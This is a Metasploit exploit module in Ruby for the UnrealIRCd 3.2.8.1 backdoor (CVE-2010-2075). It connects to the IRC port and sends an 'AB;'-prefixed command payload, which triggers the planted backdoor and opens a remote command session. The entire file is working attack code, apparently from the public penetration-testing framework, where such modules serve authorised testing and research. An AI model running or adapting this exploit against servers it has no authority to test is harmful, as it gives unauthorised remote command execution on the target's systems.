
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'UnrealIRCD 3.2.8.1 Backdoor Command Execution',
      'Description'    => %q{
          This module exploits a malicious backdoor that was added to the
        Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the
        Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.
      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2010-2075' ],
          [ 'OSVDB', '65445' ],
          [ 'URL', 'http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt' ]
        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic perl ruby telnet',
            }
        },
      'Targets'        =>
        [
          [ 'Automatic Target', { }]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Jun 12 2010'))

    register_options(
      [
        Opt::RPORT(6667)
      ])
  end

  def exploit
    connect

    print_status("Connected to #{rhost}:#{rport}...")
    banner = sock.get_once(-1, 30)
    banner.to_s.split("\n").each do |line|
      print_line("    #{line}")
    end

    print_status("Sending backdoor command...")
    sock.put("AB;" + payload.encoded + "\n")

    # Wait for the request to be handled
    1.upto(120) do
      break if session_created?
      select(nil, nil, nil, 0.25)
      handler()
    end
    disconnect
  end
end